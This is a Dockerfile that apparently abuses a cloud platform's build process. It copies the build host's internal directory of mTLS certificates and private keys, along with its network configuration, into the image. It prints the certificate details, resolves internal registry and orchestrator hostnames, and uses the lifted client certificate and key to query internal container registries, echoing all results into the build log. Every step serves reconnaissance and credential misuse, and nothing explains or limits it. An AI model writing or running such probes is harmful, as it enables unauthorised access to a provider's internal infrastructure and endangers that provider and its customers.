FROM alpine:3.20
COPY var/lib/railwayapp /f/rwy
COPY etc/hosts /f/hosts
COPY etc/resolv.conf /f/resolv
RUN sh -c 'set +e; echo "===K1==="; echo --LS--; ls -laR /f/rwy 2>&1 | head -80; echo --HOSTS--; cat /f/hosts; echo --RESOLV--; cat /f/resolv; echo --GREPCFG--; grep -rIl "registry" /f/rwy 2>/dev/null | head; echo "===K1END==="'
RUN apk add --no-cache curl bind-tools openssl >/dev/null 2>&1; echo APKOK
RUN sh -c 'set +e; echo "===K2==="; P=/f/rwy/mtls-pki; for c in $P/*.crt; do echo "## $(basename $c)"; openssl x509 -in "$c" -noout -subject -issuer 2>&1 | sed "s/^/   /"; openssl x509 -in "$c" -noout -ext subjectAltName,extendedKeyUsage 2>&1 | grep -v "^X509v3\|^ *$" | sed "s/^/   /"; done; echo "===K2END==="'
RUN sh -c 'set +e; echo "===K3==="; echo --RESOLV_IN_CONTAINER--; cat /etc/resolv.conf; for h in registry-gcp-asia-southeast1.gcp.production.rlwy.net registry.gcp.production.rlwy.net registry.metal.production.rlwy.net registry.rlwy.net registry-gcp-us-east4.gcp.production.rlwy.net orchestrator-gcp-asia-southeast1.gcp.production.rlwy.net builder-lhmgif.railway.internal; do printf "DNS %s -> " $h; getent hosts $h || echo NX; done; echo "===K3END==="'
RUN sh -c 'set +e; echo "===K4==="; P=/f/rwy/mtls-pki; for h in registry-gcp-asia-southeast1.gcp.production.rlwy.net registry.gcp.production.rlwy.net; do echo "--HOST $h--"; echo -n "plain_dns: "; curl -s -m 6 -o /tmp/o1 -w "code=%{http_code} ip=%{remote_ip} err=%{errormsg}\n" --cacert $P/server-ca-bundle.crt https://$h/v2/ 2>&1 | tail -1; echo -n "mtls_dns: "; curl -s -m 6 -o /tmp/o2 -w "code=%{http_code} ip=%{remote_ip} size=%{size_download} err=%{errormsg}\n" --cert $P/client.crt --key $P/client.key --cacert $P/server-ca-bundle.crt https://$h/v2/ 2>&1 | tail -1; echo -n "mtls_pin10.10.10.42: "; curl -s -m 6 -o /tmp/o3 -w "code=%{http_code} ip=%{remote_ip} size=%{size_download} err=%{errormsg}\n" --resolve $h:443:10.10.10.42 --cert $P/client.crt --key $P/client.key --cacert $P/server-ca-bundle.crt https://$h/v2/ 2>&1 | tail -1; done; echo "--RESULTS--"; for f in /tmp/o1 /tmp/o2 /tmp/o3; do echo "## $f"; head -c 300 $f 2>/dev/null | tr -d "\0"; echo; done; echo "===K4END==="'
